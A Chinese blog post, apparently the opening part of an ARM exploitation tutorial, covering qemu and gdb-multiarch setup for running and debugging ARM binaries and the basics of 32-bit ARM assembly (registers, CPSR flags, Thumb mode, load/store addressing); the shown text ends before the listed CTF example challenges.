<!DOCTYPE html>
<html lang="zh-Hans">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="Arm pwn"/><meta name="keywords" content="CTF, ARM, hhdx's blog" /><link rel="alternate" href="/atom.xml" title="hhdx's blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://hhdx.xyz/2020/10/17/Arm-pwn/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-177325662-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-177325662-1');
</script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
</script>

    <title>Arm pwn - hhdx's blog</title>
  <meta name="generator" content="Hexo 5.2.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">hhdx's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">hhdx's blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">Arm pwn
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-10-17
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F"><span class="toc-text">动态链接程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C"><span class="toc-text">运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85binutils"><span class="toc-text">安装binutils</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARM%E6%B1%87%E7%BC%96"><span class="toc-text">ARM汇编</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">ARM数据类型与寄存器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E7%AB%AF"><span class="toc-text">大小端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-text">寄存器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CPSR"><span class="toc-text">CPSR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#APSR"><span class="toc-text">APSR</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARM%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-text">ARM指令集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ARM-%E5%92%8C-THUMB"><span class="toc-text">ARM 和 THUMB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ARM%E6%B1%87%E7%BC%96%E7%AE%80%E4%BB%8B"><span class="toc-text">ARM汇编简介</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8LOAD-STORE"><span class="toc-text">数据存储LOAD STORE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%A4%BA%E4%BE%8B"><span class="toc-text">基础示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%8B%E5%8D%B3%E6%95%B0%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80"><span class="toc-text">立即数偏移寻址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80"><span class="toc-text">寄存器偏移寻址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scaled%E5%AF%84%E5%AD%98%E5%99%A8%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80"><span class="toc-text">scaled寄存器偏移寻址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PC%E5%81%8F%E7%A7%BB"><span class="toc-text">PC偏移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%8B%E5%8D%B3%E6%95%B0"><span class="toc-text">立即数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LOAD-STORE-%E5%A4%9A%E4%B8%AA"><span class="toc-text">LOAD STORE 多个</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#push-pop"><span class="toc-text">push pop</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%88%86%E6%94%AF"><span class="toc-text">条件执行与分支</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-text">条件执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thumb%E4%B8%AD%E7%9A%84%E6%9D%A1%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-text">Thumb中的条件执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B-BL-BX-BLX"><span class="toc-text">B&#x2F;BL&#x2F;BX&#x2F;BLX</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E5%88%86%E6%94%AF"><span class="toc-text">条件分支</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%92%8C%E5%87%BD%E6%95%B0"><span class="toc-text">栈和函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88"><span class="toc-text">栈</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-text">函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0%E4%B8%8E%E9%9D%9E%E5%8F%B6%E5%AD%90%E5%87%BD%E6%95%B0"><span class="toc-text">叶子函数与非叶子函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aarch64"><span class="toc-text">aarch64</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARM%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A"><span class="toc-text">ARM函数调用约定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-kr-leg"><span class="toc-text">pwnable.kr leg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#codegate2018-melong"><span class="toc-text">codegate2018 melong</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shanghai2018-baby-arm"><span class="toc-text">Shanghai2018 baby_arm</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
    </div>
  </div><div class="post-content"><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install qemu-user gdb-multiarch</span></span><br></pre></td></tr></table></figure>

<p>安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。</p>
<h3 id="动态链接程序"><a href="#动态链接程序" class="headerlink" title="动态链接程序"></a>动态链接程序</h3><p>对于动态链接的程序，还需要安装跨平台的lib。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-cache search <span class="string">&quot;libc&quot;</span> | grep arm</span></span><br></pre></td></tr></table></figure>

<p>安装类似libc6-ARCH-cross。</p>
<p>动态链接库被安装在类似<code>/usr/arm-linux-gnueabihf/</code>的路径。qemu不知道动态链接的位置，它预期在类似<code>/etc/qemu-binfmt/arm</code>的路径，所以可以设置软链接来避免用<code>-L</code>来指定链接库位置。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 <span class="comment"># 对于aarch64</span></span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -L /usr/arm-linux-gnueabihf ./bin</span></span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf ./bin</span></span><br></pre></td></tr></table></figure>

<p>gdb-multiarch</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gdb-multiarch</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> arch arm</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> target remote :1234</span></span><br></pre></td></tr></table></figure>

<h3 id="安装binutils"><a href="#安装binutils" class="headerlink" title="安装binutils"></a>安装binutils</h3><p>如果不安装，pwntools某些功能会报错。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search &quot;binutils&quot; | grep arm</span><br></pre></td></tr></table></figure>

<h2 id="ARM汇编"><a href="#ARM汇编" class="headerlink" title="ARM汇编"></a>ARM汇编</h2><p>不像X86，ARM是精简指令集，在寄存器上执行所有的运算，使用Load/Store指令访存。这意味着将内存中的某个32bit的值加一需要三种类型的指令（Load，Increment，Store）。</p>
<p>ARM有两种模式，ARM模式和Thumb模式。Thumb指令可以是2字节或4字节。</p>
<p>与X86的不同之处：</p>
<ul>
<li>在ARM上大多数指令可以用来条件执行</li>
<li>X86是小端存储</li>
<li>ARM在version 3之前也是小端，后面变成大端存储，并且提供了在大端和小端之间转换的功能。</li>
</ul>
<p>在ARM各个版本中也存在不同之处，该教程[4]以最通用的方式来教学，讲解32bit ARM汇编，示例面向32bit ARM v6。ARM命名：</p>
<table>
<thead>
<tr>
<th>ARM family</th>
<th>ARM architecture</th>
</tr>
</thead>
<tbody><tr>
<td>ARM7</td>
<td>ARM v4</td>
</tr>
<tr>
<td>ARM9</td>
<td>ARM v5</td>
</tr>
<tr>
<td>ARM11</td>
<td>ARM V6</td>
</tr>
<tr>
<td>Cortex-A</td>
<td>ARM V7-A</td>
</tr>
<tr>
<td>Cortex-R</td>
<td>ARM V7-R</td>
</tr>
<tr>
<td>Cortex-M</td>
<td>ARM V7-M</td>
</tr>
</tbody></table>
<h3 id="ARM数据类型与寄存器"><a href="#ARM数据类型与寄存器" class="headerlink" title="ARM数据类型与寄存器"></a>ARM数据类型与寄存器</h3><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>对于32bit ARM有带符号和不带符号的“字，半字，字节”这三种尺寸，对于”半字“由<code>-h</code>或<code>-sh</code>表示，对于”字节“由<code>-b</code>和<code>-sb</code>表示，字没有符号表示，默认就是”字“。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr &#x3D; Load Word</span><br><span class="line">ldrh &#x3D; Load unsigned Half Word</span><br><span class="line">ldrsh &#x3D; Load signed Half Word</span><br><span class="line">ldrb &#x3D; Load unsigned Byte</span><br><span class="line">ldrsb &#x3D; Load signed Bytes</span><br><span class="line"></span><br><span class="line">str &#x3D; Store Word</span><br><span class="line">strh &#x3D; Store unsigned Half Word</span><br><span class="line">strsh &#x3D; Store signed Half Word</span><br><span class="line">strb &#x3D; Store unsigned Byte</span><br><span class="line">strsb &#x3D; Store signed Byte</span><br></pre></td></tr></table></figure>

<h4 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h4><p>指令固定小端存储（？存疑），数据访问大小端都可以，大小端由CPSR(Current Program Status Register)寄存器的bit9控制。</p>
<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p>由16个用户可用的寄存器，其他寄存器需要特权模式使用。这16寄存器可以分成两组，通用寄存器和特殊用途寄存器。</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Alias</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td>R0</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R1</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R2</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R3</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R4</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R5</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R6</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R7</td>
<td>-</td>
<td>Holds Syscall Number</td>
</tr>
<tr>
<td>R8</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R9</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R10</td>
<td>-</td>
<td>General purpose</td>
</tr>
<tr>
<td>R11</td>
<td>FP</td>
<td>Frame Pointer</td>
</tr>
<tr>
<td><strong>Special</strong></td>
<td><strong>Purpose</strong></td>
<td><strong>Registers</strong></td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
<td>Intra Procedural Call</td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td>Stack Pointer</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td>Link Register</td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td>Program Counter</td>
</tr>
<tr>
<td>CPSR</td>
<td>-</td>
<td>Current Program Status Registers</td>
</tr>
</tbody></table>
<p>R0-R12：用来存储临时数据，指针等。例如：R0当作累加器在算数运算期间，也可以存储函数返回值。R7在系统调用时用来存储系统调用号。R11用来跟踪栈帧的边界。R0-R3存储调用的前四个参数。</p>
<p>R13：SP指向栈顶，函数返回时恢复。</p>
<p>R14：LR指向函数调用处的下一条指令，类似储存函数返回地址。</p>
<p>R15：PC自加，ARM模式每次+4，THUMB模式每次+2（？存疑），在执行期间PC存储当前指令地址+8的地方（为了兼容老型号，老型号会预取2条指令），THUMB则是+4.</p>
<h4 id="CPSR"><a href="#CPSR" class="headerlink" title="CPSR"></a>CPSR</h4><p><img src="https://raw.githubusercontent.com/lc1838228782/pics/master/img20201010001303.png"></p>
<p>左侧是最高有效位，右侧是最低有效位。</p>
<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">N (Negative)</td>
<td align="left">使能当指令产生负数</td>
</tr>
<tr>
<td align="left">Z (Zero)</td>
<td align="left">使能当指令产生0</td>
</tr>
<tr>
<td align="left">C (Carry)</td>
<td align="left">使能如果指令产生的结果需要33bit</td>
</tr>
<tr>
<td align="left">V (Overflow)</td>
<td align="left">使能如果指令产生的结果32bit不够用</td>
</tr>
<tr>
<td align="left">E (Endian-bit)</td>
<td align="left">标识大小端，0小端1大端</td>
</tr>
<tr>
<td align="left">T (Thumb-bit)</td>
<td align="left">标识ARM或THUMB模式</td>
</tr>
<tr>
<td align="left">M (Mode-bits)</td>
<td align="left">标识特权级别(USR, SVC, etc.).</td>
</tr>
<tr>
<td align="left">J (Jazelle)</td>
<td align="left">允许ARM硬件执行java字节码</td>
</tr>
</tbody></table>
<p>N：在结果是有符号的二进制补码情况下，如果结果为负数，则N=1；如果结果为非负数，则N=0。</p>
<p>Z：如果结果为0，则Z=1;如果结果为非零，则Z=0。</p>
<p>C：其设置分一下几种情况：</p>
<p>对于加法指令（包含比较指令CMN），如果产生进位，则C=1;否则C=0。</p>
<p>对于减法指令（包括比较指令CMP），如果产生借位，则C=0;否则C=1。</p>
<p>对于有移位操作的非法指令，C为移位操作中最后移出位的值。</p>
<p>对于其他指令，C通常不变。</p>
<p>V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V=1;如果无溢出发生，则V=0;对于其他指令，V通常不发生变化。</p>
<p>假设现在用 <code>cmp</code> 指令来比较 <code>1</code> 和 <code>2</code> ，<code>cmp</code> 会进行减法运算 <code>1 - 2 = -1</code> 结果为负数，这时这个运算结果就会影响到 <code>CPSR</code> 的 <code>N</code> 标志位，因为 <code>cmp</code> 的运算结果是负数所以会把 <code>N</code> 置为 <code>1</code>，如果是比较 <code>2</code> 和 <code>2</code> 运算结果是 <code>0</code> 这会置位 <code>Z</code> 标志位，但是要注意一点是 <code>cmp</code> 的执行结果不会影响它使用的寄存器只会 <strong>隐式</strong> 地影响 <code>CPSR</code> 寄存器的值。</p>
<h4 id="APSR"><a href="#APSR" class="headerlink" title="APSR"></a>APSR</h4><p>包含<code>N</code>, <code>Z</code>, <code>C</code>, <code>V</code>这几个运算标志位。</p>
<p><code>C</code>出现的条件：</p>
<ol>
<li>加法运算结果大于等于2^32</li>
<li>减法运算结果是正数或0</li>
<li>桶式移位的结果，在move或者逻辑指令</li>
</ol>
<h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><h4 id="ARM-和-THUMB"><a href="#ARM-和-THUMB" class="headerlink" title="ARM 和 THUMB"></a>ARM 和 THUMB</h4><p>ARM和THUMB主要是指令集方面的不同，ARM指令是32bit的，THUMB指令是16bit(可以是32bit)，编写shellcode需要避免null byte，使用THUMB可以减少null byte的概率。</p>
<p>THUMB指令集不同版本之间差异较大，不必细究，具体版本具体查阅<a target="_blank" rel="noopener" href="http://infocenter.arm.com/help/index.jsp">infocenter</a>就可以。</p>
<p>THUMB版本：Thumb-1，Thumb-2，ThumbEE。不同名称只为区分指令集，处理器总是称之为Thumb。</p>
<p><strong>ARM和Thumb的不同：</strong></p>
<ul>
<li>条件执行，所有的ARM指令都支持条件执行，Thumb不支持（一些版本使用<code>IT</code>指令支持）。</li>
<li>32bit的ARM和Thumb指令，Thumb指令有<code>.w</code>后缀。</li>
<li>桶式移位是ARM模式的一个特征，将多条指令合为一条。</li>
</ul>
<p>切换模式：使用<code>BX</code>或者<code>BLX</code>指令，并且设置目标地址+1，不必担心对齐。可以通过CPSR寄存器知晓目前的模式。</p>
<h4 id="ARM汇编简介"><a href="#ARM汇编简介" class="headerlink" title="ARM汇编简介"></a>ARM汇编简介</h4><p>指令模板：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure>

<ul>
<li>MNEMONIC 指令名称</li>
<li>{S} 可选项。如果给出，就将会根据结果更新条件flag</li>
<li>{condition} 执行该条命令所需要满足的条件。</li>
<li>{Rd} 目标寄存器，存储指令的结果。</li>
<li>Operand1 参数一，可以是寄存器或者立即数</li>
<li>Operand2 参数二，可以是立即数或者寄存器（寄存器可以进行可选的移位）</li>
</ul>
<p>参数二的概念有些复杂，给出参数二的几个示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#123                    - 立即数</span><br><span class="line">Rx                      - 寄存器X</span><br><span class="line">Rx, ASR n               - 寄存器X算数右移n位 (1 &#x3D; n &#x3D; 32)</span><br><span class="line">Rx, LSL n               - 寄存器X逻辑左移n位 (0 &#x3D; n &#x3D; 31)</span><br><span class="line">Rx, LSR n               - 寄存器X逻辑左移n位 n bits (1 &#x3D; n &#x3D; 32)</span><br><span class="line">Rx, ROR n               - 寄存器X循环右移n位 (1 &#x3D; n &#x3D; 31)</span><br><span class="line">Rx, RRX                 - 寄存器X循环右移1位, with extend？</span><br></pre></td></tr></table></figure>

<p>指令示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ADD   R0, R1, R2         - R0 &#x3D; R1 + R2</span><br><span class="line">ADD   R0, R1, #2         - R0 &#x3D; R1 + 2</span><br><span class="line">MOVLE R0, #5             - 当作MOVLE R0, R0, #5; if less or equal: R0 &#x3D; 5</span><br><span class="line">MOV   R0, R1, LSL #1     - R0 &#x3D; R1 &lt;&lt; 1</span><br></pre></td></tr></table></figure>

<p>常见指令</p>
<table>
<thead>
<tr>
<th align="center">Instruction</th>
<th align="left">Description</th>
<th align="center">Instruction</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MOV</td>
<td align="left">Move data</td>
<td align="center">EOR</td>
<td align="left">Bitwise XOR</td>
</tr>
<tr>
<td align="center">MVN</td>
<td align="left">Move and negate</td>
<td align="center">LDR</td>
<td align="left">Load</td>
</tr>
<tr>
<td align="center">ADD</td>
<td align="left">Addition</td>
<td align="center">STR</td>
<td align="left">Store</td>
</tr>
<tr>
<td align="center">SUB</td>
<td align="left">Subtraction</td>
<td align="center">LDM</td>
<td align="left">Load Multiple</td>
</tr>
<tr>
<td align="center">MUL</td>
<td align="left">Multiplication</td>
<td align="center">STM</td>
<td align="left">Store Multiple</td>
</tr>
<tr>
<td align="center">LSL</td>
<td align="left">Logical Shift Left</td>
<td align="center">PUSH</td>
<td align="left">Push on Stack</td>
</tr>
<tr>
<td align="center">LSR</td>
<td align="left">Logical Shift Right</td>
<td align="center">POP</td>
<td align="left">Pop off Stack</td>
</tr>
<tr>
<td align="center">ASR</td>
<td align="left">Arithmetic Shift Right</td>
<td align="center">B</td>
<td align="left">Branch</td>
</tr>
<tr>
<td align="center">ROR</td>
<td align="left">Rotate Right</td>
<td align="center">BL</td>
<td align="left">Branch with Link</td>
</tr>
<tr>
<td align="center">CMP</td>
<td align="left">Compare</td>
<td align="center">BX</td>
<td align="left">Branch and eXchange</td>
</tr>
<tr>
<td align="center">AND</td>
<td align="left">Bitwise AND</td>
<td align="center">BLX</td>
<td align="left">Branch with Link and eXchange</td>
</tr>
<tr>
<td align="center">ORR</td>
<td align="left">Bitwise OR</td>
<td align="center">SWI/SVC</td>
<td align="left">System Call</td>
</tr>
</tbody></table>
<h3 id="数据存储LOAD-STORE"><a href="#数据存储LOAD-STORE" class="headerlink" title="数据存储LOAD STORE"></a>数据存储LOAD STORE</h3><h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R2, [R0]   将R0所存地址处的数据加载到R2</span><br><span class="line">STR R2, [R1]   将R2存储到R1所指示的地址处</span><br></pre></td></tr></table></figure>

<p>PC相对寻址。将const数据存储在代码段。注意实际PC预取两条指令。</p>
<p><img src="https://azeria-labs.com/wp-content/uploads/2017/04/pc-relative1-1.png.pagespeed.ce.hWNi5fEpQV.png" alt="relative addressing"></p>
<h4 id="立即数偏移寻址"><a href="#立即数偏移寻址" class="headerlink" title="立即数偏移寻址"></a>立即数偏移寻址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, #2]  @ address mode: offset. 将R2数据存储到R1+2地址处</span><br><span class="line">str r2, [r1, #4]! @ address mode: pre-indexed. 将R2数据存储到R1+4地址处，R1&#x3D;R1+4</span><br><span class="line">ldr r3, [r1], #4  @ address mode: post-indexed. 将R1地址处的数据读取到R3，R1&#x3D;R1+4</span><br></pre></td></tr></table></figure>

<h4 id="寄存器偏移寻址"><a href="#寄存器偏移寻址" class="headerlink" title="寄存器偏移寻址"></a>寄存器偏移寻址</h4><p>和上面一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2]  @ address mode: offset.  </span><br><span class="line">str r2, [r1, r2]! @ address mode: pre-indexed.</span><br><span class="line">ldr r3, [r1], r2  @ address mode: post-indexed.</span><br></pre></td></tr></table></figure>

<h4 id="scaled寄存器偏移寻址"><a href="#scaled寄存器偏移寻址" class="headerlink" title="scaled寄存器偏移寻址"></a>scaled寄存器偏移寻址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str r2, [r1, r2, LSL#2]  @ address mode: offset. R1+R2&lt;&lt;2</span><br><span class="line">str r2, [r1, r2, LSL#2]! @ address mode: pre-indexed. R1 &#x3D; R1 + R2&lt;&lt;2</span><br><span class="line">ldr r3, [r1], r2, LSL#2  @ address mode: post-indexed. R1 &#x3D; R1 + R2&lt;&lt;2</span><br></pre></td></tr></table></figure>

<h4 id="PC偏移"><a href="#PC偏移" class="headerlink" title="PC偏移"></a>PC偏移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">   ldr r0, &#x3D;jump        &#x2F;* load the address of the function label jump into R0 *&#x2F;</span><br><span class="line">   ldr r1, &#x3D;0x68DB00AD  &#x2F;* load the value 0x68DB00AD into R1 *&#x2F;</span><br><span class="line">jump:</span><br><span class="line">   ldr r2, &#x3D;511         